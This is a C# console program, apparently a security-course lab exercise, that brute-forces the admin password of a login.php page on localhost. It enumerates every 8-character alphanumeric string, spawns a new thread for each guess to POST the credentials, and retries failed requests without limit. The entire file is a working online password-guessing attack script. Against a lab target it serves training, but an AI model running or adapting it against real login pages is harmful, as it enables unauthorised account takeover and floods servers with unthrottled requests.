using System;
using System.Net;
using System.IO;
using System.Text;
using System.Threading;

internal class Program
{
    public static string InvalidToken = "4439f14af03c1454a886a3b24101197e";
    public static string Abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    public delegate void PasswordHandler(string password);
    public static DateTime Start;

    static void Main(string[] args)
    {
        Start = DateTime.Now;
        CreatePassword(8, CheckPassword);
    }

    public static void SingIn(string password)
    {
        try
        {
            string url = "http://localhost:81/security.permaviat.ru/login.php";
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";

            string PostData = $"login=admin&password={password}";
            byte[] Data = Encoding.ASCII.GetBytes(PostData);
            request.ContentLength = Data.Length;

            using (var stream = request.GetRequestStream())
            {
                stream.Write(Data, 0, Data.Length);
            }

            HttpWebResponse Response = (HttpWebResponse)request.GetResponse();
            string ResponseFromServer = new StreamReader(Response.GetResponseStream()).ReadToEnd();
            string Status = ResponseFromServer == InvalidToken ? "TRUE" : "FALSE";

            TimeSpan Delta = DateTime.Now.Subtract(Start);
            Console.WriteLine(Delta.ToString(@"hh\:mm\:ss") + $": {password} - {Status}");
        }
        catch (Exception exp)
        {
            TimeSpan Delta = DateTime.Now.Subtract(Start);
            Console.WriteLine(Delta.ToString(@"hh\:mm\:ss") + $": {password} - ошибка");
            SingIn(password);
        }
    }

    public static void CheckPassword(string password)
    {
        Thread thread = new Thread(() => SingIn(password));
        thread.Start();
    }

    public static void CreatePassword(int numberChar, PasswordHandler processPassword)
    {
        char[] chars = Abc.ToCharArray();
        int[] indices = new int[numberChar];
        long totalCombinations = (long)Math.Pow(chars.Length, numberChar);

        for (long i = 0; i < totalCombinations; i++)
        {
            StringBuilder password = new StringBuilder(numberChar);
            for (int j = 0; j < numberChar; j++)
                password.Append(chars[indices[j]]);

            processPassword(password.ToString());

            for (int j = numberChar - 1; j >= 0; j--)
            {
                indices[j]++;
                if (indices[j] < chars.Length)
                    break;
                indices[j] = 0;
            }
        }
    }
}